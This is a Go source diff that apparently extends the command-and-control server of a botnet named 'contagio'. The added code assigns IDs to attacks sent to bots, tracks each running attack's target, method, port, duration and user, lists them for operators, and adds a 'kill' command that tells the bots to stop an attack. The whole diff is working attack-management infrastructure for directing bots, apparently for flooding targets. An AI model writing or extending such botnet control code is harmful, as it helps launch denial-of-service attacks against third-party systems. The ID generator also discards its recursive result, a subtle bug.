@@ -3,6 +3,7 @@ package cnc
 import (
 	"bufio"
 	"bytes"
+	"contagio/bot/utils"
 	"contagio/contagio/bot_server"
 	"contagio/contagio/cnc/database"
 	"fmt"
@@ -10,6 +11,9 @@ import (
 	"net/textproto"
 	"strconv"
 	"strings"
+	"sync"
+	"text/tabwriter"
+	"time"
 )
 
 func (c *Connection) CommandHandler() error {
@@ -76,9 +80,14 @@ func (c *Connection) CommandHandler() error {
 				l := c.NewLog(ATTACK_STARTED, cmd[1], strings.TrimPrefix(cmd[0], "!"), cmd[3], cmd[2])
 				go l.SendLog()
 
-				go bot_server.SendCommand(_command)
+				id := c.genId()
+
+				go c.NewAttack(cmd[3], strings.TrimPrefix(cmd[0], "!"), cmd[1], cmd[2], id)
+
+				go bot_server.SendCommand(_command + " id=" + strconv.Itoa(id))
 				bc := bot_server.BotCount
 				botsc := strings.ReplaceAll(c.config.Cnc.CommandSent, "{bots}", strconv.Itoa(bc))
+				botsc = strings.ReplaceAll(botsc, "{id}", strconv.Itoa(id))
 				c.conn.Write([]byte(GeneratePrompt(botsc)))
 				return nil
 
@@ -90,6 +99,17 @@ func (c *Connection) CommandHandler() error {
 
 	c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.UnknownCommandError)))
 	return nil
+}
+
+func (c *Connection) genId() int {
+	id := utils.RandomInt(3)
+
+	_, ok := AttackMap.Load(id)
+	if ok {
+		c.genId()
+	}
+
+	return id
 }
 
 func (c *Connection) isSyntaxError(command string, cmdinfo MethodsInfo) bool {
@@ -349,4 +369,107 @@ func (c *Connection) Help() {
 	}
 
 	c.conn.Write(bytes.TrimSuffix([]byte(GeneratePrompt(strings.Join(res, "\n\r"))), []byte{0xA, 0xD}))
+}
+
+func RunningCnc(_ string, c *Connection) {
+
+	tab := strings.Builder{}
+
+	w := tabwriter.NewWriter(&tab, 10, 10, 4, ' ', tabwriter.TabIndent)
+	fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "ID", "Target", "Method", "Port", "Length", "Finish", "User")
+	fmt.Fprintf(w, "\n%s\t%s\t%s\t%s\t%s\t%s\t%s\t\r", "======", "======", "======", "======", "======", "======", "======")
+	AttackMap.Range(func(key, value interface{}) bool {
+		i := value.(attackStruct)
+		if i.Login == c.login || c.login == c.config.RootLogin {
+			fmt.Fprintf(w, "\n%d\t%s\t%s\t%s\t%s\t%s\t%s\t\r", i.ID, strings.TrimPrefix(i.Target, "https://"), i.Method, i.Port, strconv.Itoa(i.Duration), strconv.Itoa(i.Finish), i.Login)
+			fmt.Fprintln(w)
+		}
+		return true
+	})
+
+	w.Flush()
+	if tab.Len() < 160 { // default len 144
+		c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.NoActiveAttacksError)))
+		return
+	}
+	c.conn.Write([]byte(tab.String()))
+}
+func (c *Connection) NewAttack(duration string, method string, target string, port string, id int) {
+	defer Catch()
+
+	dur, err := strconv.Atoi(duration)
+	if err != nil {
+		return
+	}
+
+	var wg sync.WaitGroup
+	wg.Add(1)
+	ch := make(chan int)
+
+	go func() {
+		defer wg.Done()
+
+		for i := 0; i <= dur; i++ {
+			select {
+			case idd := <-ch:
+				if idd == id {
+					AttackMap.Delete(idd)
+					return
+				}
+			default:
+				var str = attackStruct{
+					ch:       ch,
+					ID:       id,
+					Duration: dur,
+					Finish:   dur - i,
+					Login:    c.login,
+					Method:   method,
+					Target:   target,
+					Port:     port,
+				}
+
+				AttackMap.Store(id, str)
+				if i == dur {
+					AttackMap.Delete(id)
+				}
+
+				time.Sleep(1 * time.Second)
+			}
+		}
+	}()
+
+	wg.Wait()
+}
+
+func KillAttack(command string, c *Connection) {
+	_id := strings.Split(command, " ")
+
+	var res = c.config.Cnc.CommandInvalidSyntax
+
+	if len(_id) < 2 {
+		res = strings.ReplaceAll(res, "{syntax}", "kill <ATTACK ID>")
+		res = strings.ReplaceAll(res, "{example}", "kill 123")
+
+		c.conn.Write([]byte(GeneratePrompt(res)))
+		return
+	}
+
+	id, err := strconv.Atoi(_id[1])
+	if err != nil {
+		c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.AttackIdNotFoundError)))
+		return
+	}
+
+	if v, ok := AttackMap.Load(id); ok {
+		bot_server.SendCommand("!kill " + _id[1])
+		go func() {
+			v.(attackStruct).ch <- id
+		}()
+	} else {
+		c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.AttackIdNotFoundError)))
+		return
+	}
+
+	c.conn.Write([]byte(GeneratePrompt(c.config.Cnc.CommandExecuted)))
+
 }
